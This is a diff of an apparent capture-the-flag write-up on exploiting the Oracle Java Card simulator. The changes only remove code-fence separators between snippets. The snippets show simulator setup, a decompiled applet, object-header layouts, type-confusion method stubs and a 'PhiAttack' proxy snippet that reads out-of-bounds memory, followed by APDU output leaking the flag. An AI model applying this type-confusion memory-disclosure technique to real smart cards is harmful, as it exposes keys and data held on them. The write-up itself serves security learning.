@@ -13,11 +13,6 @@ creating: attachments/
  inflating: attachments/files/java_card_simulator-3_1_0-u5-win-bin-do-b_70-09_mar_2021.msi
  inflating: attachments/files/java_card_tools-win-bin-b_17-06_jul_2021.zip
  inflating: attachments/start.sh
-```
-
-
-
-```
 [...]
 
 verifycap() {
@@ -67,11 +62,6 @@ EOF
 wine 'C:\Program Files\Oracle\Java Card Development Kit Simulator 3.1.0\bin\cref_t1.exe' -nobanner -nomeminfo &
 sleep 5
 java -Djc.home="$JC_HOME_SIM" -classpath "$SIM_CP" com.sun.javacard.apdutool.Main -nobanner -noatr $script
-```
-
-
-
-```
 // Decompiled with: CFR 0.152
 // Class Version: 7
 package com.rw.hello;
@@ -127,11 +117,6 @@ extends Applet {
  }
  }
 }
-```
-
-
-
-```
 struct Array { // header length: 8 byte
  u16 objectTag = 0x8000; // this object represents a byte array
  u8 securityContext = 0x22;
@@ -141,11 +126,6 @@ struct Array { // header length: 8 byte
  // end of header, followed by data
  u8 data[length];
 };
-```
-
-
-
-```
 struct ObjectHeader { // length: 6 byte
  u16 objectTag;
  u8 securityContext;
@@ -161,27 +141,12 @@ struct ExploitApplet {
  u16 tag = 0x1234; // short
  u16 tag2 = 0x5678; // short
 };
-```
-
-
-
-```
 public byte[] fromShort(short input) {
  return null; // this is fine!
 }
-```
-
-
-
-```
 public byte[] fromShort(byte[] input) {
  return this; // this is fine!
 }
-```
-
-
-
-```
 // Perform the PhiAttack
 PhiProxy proxyInstance = new PhiProxy();
 Phi phiInstance = proxyInstance;
@@ -205,11 +170,6 @@ Util.arrayCopyNonAtomic(
  (short) 0x85
 );
 apdu.setOutgoingAndSend((short) 0, (short) 0x85);
-```
-
-
-
-```
 [ INFO: ] Verification completed with 0 warnings and 0 errors.
 All verification finished
 Mask has now been initialized for use
@@ -218,10 +178,5 @@ OUTPUT ON;
 CLA: 88, INS: 66, P1: 00, P2: 00, Lc: 00, Le: 85, 30, 72, 77, 63, 74, 66, 7b, 48, 34, 70, 70, 79, 43, 61, 33, 64, 37, 30, 36, 32, 32, 39, 39, 31, 62, 39, 37, 32, 33, 38, 39, 61, 31, 66, 30, 35, 37, 35, 65, 64, 37, 64, 32, 30, 34, 38, 38, 66, 7d, 80, 68, 01, 01, 80, 73, 01, 01, 00, 80, 00, 00, ff, 00, 01, 03, 00, 00, 86, d1, 86, d2, 86, d3, 80, 00, 00, 00, 00, 1c, 00, 06, aa, bb, cc, dd, ee, 10, 20, 00, 00, 00, 11, 05, 00, c6, 20, 00, 11, 00, 00, 1d, 00, 94, 00, c3, 01, 00, 80, 00, 10, 00, 00, 1c, 00, 04, 73, 61, 66, 65, 80, 00, 10, 00, 00, 1c, 00, 0c, 63, 6f, 6d, 2e, 72, 77, SW1: 90, SW2: 00
 C-JCRE was powered down.
 bye%
-```
-
-
-
-```
 0rwctf{H4ppyCa3d70622991b972389a1f0575ed7d20488f}.h...s......ÿ......Ñ.Ò.Ó........ª»ÌÝî. ......Æ ........Ã..........safe........com.rw
 ```
